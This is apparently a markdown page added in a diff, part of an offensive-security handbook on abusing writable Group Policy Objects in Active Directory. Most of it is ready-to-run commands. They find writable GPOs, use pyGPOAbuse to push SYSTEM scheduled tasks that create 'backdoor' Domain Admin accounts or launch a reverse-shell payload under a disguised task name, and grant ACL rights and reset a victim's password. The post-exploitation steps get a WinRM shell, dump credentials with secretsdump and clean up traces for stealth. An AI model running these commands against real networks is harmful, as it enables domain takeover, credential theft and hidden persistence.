@@ -1,0 +1,251 @@
+---
+title: "GPO Abuse"
+---
+
+Group Policy Objects (GPOs) control configuration across all machines and users in their linked OUs. If you have write permissions on a GPO (GenericAll, GenericWrite, WriteProperty), you can push a scheduled task to every computer in scope and get SYSTEM. The Default Domain Controllers Policy is the highest-value target because it applies to every DC.
+
+## Enumeration
+
+<AccordionGroup>
+  <Accordion title="PowerView">
+    ```powershell wrap
+    # All GPOs
+    Get-DomainGPO
+
+    # GPOs applied to a specific computer
+    Get-DomainGPO -ComputerIdentity $TARGET
+
+    # Find GPOs where a user/group has write rights
+    Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,$DC" -ResolveGUIDs | Where-Object {
+        $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty" -and
+        $_.SecurityIdentifier -eq (Get-DomainUser $USER).objectsid
+    }
+
+    # Map GPO GUIDs to display names and linked OUs
+    Get-DomainGPO | Select-Object displayname,name,gpcfilesyspath
+    Get-DomainGPOLocalGroup
+
+    # Find interesting GPO permissions for current user
+    Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
+        $_.ObjectAceType -eq "All" -and
+        $_.IdentityReferenceName -like "*$env:USERNAME*"
+    }
+    ```
+  </Accordion>
+  <Accordion title="nxc ldap">
+    ```bash wrap
+    # Enumerate GPOs
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -M gpo
+
+    # Enumerate GPO permissions
+    nxc ldap $DC_IP -u $USER -p $PASSWORD --gpo-id "$GPO_ID"
+    ```
+  </Accordion>
+  <Accordion title="Well-Known Default GPO GUIDs">
+    These GUIDs are identical across every Active Directory environment.
+
+    | GUID | Name | Scope |
+    |------|------|-------|
+    | `31B2F340-016D-11D2-945F-00C04FB984F9` | Default Domain Controllers Policy | DC OU — highest value target |
+    | `6AC1786C-016F-11D2-945F-00C04fB984F9` | Default Domain Policy | All domain computers and users |
+
+    <Warning>
+    GenericAll on the Default Domain Controllers Policy means SYSTEM on every DC in the domain.
+    </Warning>
+  </Accordion>
+</AccordionGroup>
+
+## pyGPOAbuse
+
+Tool by Hackndo for writing scheduled tasks into GPOs directly over LDAP without requiring SYSVOL write access.
+
+```
+python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD [options]
+```
+
+<AccordionGroup>
+  <Accordion title="GPO Selection">
+    One is required.
+
+    | Flag | Description |
+    |------|-------------|
+    | `-gpo-id <GUID>` | Target GPO by GUID (no curly braces) |
+    | `-gpo-name <name>` | Target GPO by display name (resolved via LDAP) |
+  </Accordion>
+  <Accordion title="Task Options">
+    | Flag | Description |
+    |------|-------------|
+    | `-command <cmd>` | Command to run as SYSTEM (default: adds `john:H4x00r123..` as local admin) |
+    | `-powershell` | Wrap command in PowerShell instead of cmd.exe |
+    | `-taskname <name>` | Scheduled task name (default: `TASK_<random>`) |
+    | `-description <text>` | Task description |
+    | `-mod-date <date>` | Task modification date shown in GPO (default: 30 days ago, for stealth) |
+    | `-f` | Force immediate execution: sets task start time to now, do not wait for GP refresh |
+    | `--cleanup` | Delete the scheduled task XML and roll back the GPO version number |
+  </Accordion>
+  <Accordion title="Scope / Targeting">
+    | Flag | Description |
+    |------|-------------|
+    | `-user` | Apply as a user GPO (runs as logged-in user, not SYSTEM) |
+    | `-user-as-admin` | User GPO but runs as SYSTEM |
+    | `-filter-enabled` | Enable host/user targeting (mirrors SharpGPOAbuse `--FilterEnabled`) |
+    | `-target-dns-name <FQDN>` | Only run the task on this specific computer |
+    | `-target-username DOMAIN\user` | Only run the task for this specific user |
+    | `-target-user-sid <SID>` | Target user by SID (more robust than username) |
+  </Accordion>
+  <Accordion title="Authentication">
+    | Flag | Description |
+    |------|-------------|
+    | `-dc-ip $DC_IP` | Domain controller IP |
+    | `-hashes LMHASH:NTHASH` | Pass the hash |
+    | `-k` | Kerberos auth (reads `KRB5CCNAME`) |
+    | `-ccache <file>` | Specify ccache file explicitly |
+    | `-ldaps` | Use LDAPS instead of LDAP |
+  </Accordion>
+  <Accordion title="Verbosity">
+    | Flag | Description |
+    |------|-------------|
+    | `-v` | Verbose |
+    | `-vv` | Very verbose |
+  </Accordion>
+</AccordionGroup>
+
+### One-Liners
+
+```bash wrap
+# Default — adds john:H4x00r123.. as local admin, fire immediately
+python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD -gpo-id $GPO_ID -dc-ip $DC_IP -f
+
+# Add specific user to local admins
+python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD -gpo-id $GPO_ID -dc-ip $DC_IP \
+  -command "net localgroup administrators $USER /add" -f
+
+# Add new backdoor local admin
+python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD -gpo-id $GPO_ID -dc-ip $DC_IP \
+  -command "net user backdoor Pass123! /add && net localgroup administrators backdoor /add" -f
+
+# PowerShell reverse shell with stealth task name
+python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD -gpo-id $GPO_ID -dc-ip $DC_IP \
+  -powershell -command "$PAYLOAD" -taskname "WindowsUpdate" -f
+
+# Target a single machine only (scoped, stealthier)
+python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD -gpo-id $GPO_ID -dc-ip $DC_IP \
+  -command "$COMMAND" -filter-enabled -target-dns-name $DC_FQDN -f
+
+# Add to Domain Admins via the DC (Default Domain Controllers Policy GUID)
+python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD \
+  -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -dc-ip $DC_IP \
+  -command "net user backdoor Pass123! /add && net group \"Domain Admins\" backdoor /add" \
+  -filter-enabled -target-dns-name $DC_FQDN -f
+
+# Pass the hash
+python3 pygpoabuse.py $DOMAIN/$USER -hashes aad3b435b51404eeaad3b435b51404ee:$NTHASH \
+  -gpo-id $GPO_ID -dc-ip $DC_IP -f
+
+# Cleanup
+python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD -gpo-id $GPO_ID -dc-ip $DC_IP --cleanup
+```
+
+## ACL Prerequisite Chain
+
+GPO abuse usually sits at the end of an ACL chain. A common path is WriteDacl or WriteOwner on a user that already has GPO write access.
+
+<Steps>
+  <Step title="Grant yourself GenericAll on the victim account">
+    ```powershell wrap
+    # CORRECT syntax — -TargetIdentity and -PrincipalIdentity are required
+    Add-DomainObjectAcl -TargetIdentity $VICTIM -PrincipalIdentity $ATTACKER -Rights All
+
+    # WRONG — -Target is not a valid parameter and silently does nothing
+    # Add-DomainObjectAcl -Target $VICTIM -Rights All
+    ```
+  </Step>
+  <Step title="Reset the victim's password">
+    ```powershell wrap
+    $pass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
+    Set-DomainUserPassword -Identity $VICTIM -AccountPassword $pass
+    ```
+  </Step>
+  <Step title="Confirm GPO write permissions">
+    ```powershell wrap
+    Get-DomainObjectAcl -Identity $GPO_NAME -ResolveGUIDs | Where-Object {
+        $_.IdentityReferenceName -like "*$VICTIM*"
+    }
+    ```
+  </Step>
+  <Step title="Abuse the GPO">
+    ```bash wrap
+    python3 pygpoabuse.py $DOMAIN/$VICTIM:NewPass123! -gpo-id $GPO_ID -dc-ip $DC_IP -f
+    ```
+  </Step>
+</Steps>
+
+## Attack Scenarios
+
+<AccordionGroup>
+  <Accordion title="GenericAll on Default Domain Controllers Policy">
+    Highest-value path. The Default Domain Controllers Policy applies to every DC OU. Push a task and get SYSTEM on all DCs.
+
+    ```bash wrap
+    # The GUID is identical in every AD environment
+    python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD \
+      -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 \
+      -dc-ip $DC_IP \
+      -command "net user backdoor Pass123! /add && net group \"Domain Admins\" backdoor /add" \
+      -filter-enabled -target-dns-name $DC_FQDN -f
+    ```
+  </Accordion>
+  <Accordion title="GenericAll on Default Domain Policy">
+    Applies to all domain computers and users. Broad execution — every machine in the domain runs the task on next GP refresh. Noisy.
+
+    ```bash wrap
+    python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD \
+      -gpo-id 6AC1786C-016F-11D2-945F-00C04fB984F9 \
+      -dc-ip $DC_IP \
+      -command "$COMMAND" -f
+    ```
+  </Accordion>
+  <Accordion title="Scoped Attack (Single Target)">
+    Use `-filter-enabled -target-dns-name` to restrict execution to one machine. Much stealthier than domain-wide deployment.
+
+    ```bash wrap
+    python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD \
+      -gpo-id $GPO_ID -dc-ip $DC_IP \
+      -command "$COMMAND" \
+      -filter-enabled -target-dns-name $TARGET_FQDN -f
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Post-Abuse
+
+<Steps>
+  <Step title="Force GP refresh on target (if you have a shell)">
+    ```powershell wrap
+    gpupdate /force
+    Invoke-GPUpdate -Force
+    ```
+  </Step>
+  <Step title="Verify the backdoor account landed">
+    ```bash wrap
+    nxc smb $DC_IP -u backdoor -p Pass123! --local-auth
+    ```
+  </Step>
+  <Step title="Get a shell">
+    ```bash wrap
+    evil-winrm -i $DC_IP -u backdoor -p Pass123!
+    ```
+  </Step>
+  <Step title="Dump credentials">
+    ```bash wrap
+    secretsdump.py $DOMAIN/backdoor:Pass123!@$DC_IP
+    ```
+  </Step>
+  <Step title="Cleanup">
+    ```bash wrap
+    python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD -gpo-id $GPO_ID -dc-ip $DC_IP --cleanup
+    ```
+
+    `--cleanup` removes the scheduled task XML from SYSVOL and rolls back the GPO version counter.
+  </Step>
+</Steps>
